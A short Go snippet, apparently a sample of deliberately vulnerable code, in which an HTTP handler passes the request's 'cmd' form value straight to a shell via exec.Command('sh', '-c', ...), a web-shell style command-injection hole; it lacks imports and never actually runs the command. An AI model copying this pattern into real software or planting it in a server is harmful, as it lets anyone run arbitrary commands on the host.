package main
func handler(r *http.Request) { run(r.FormValue("cmd")) }
func run(c string) { exec.Command("sh", "-c", c) }
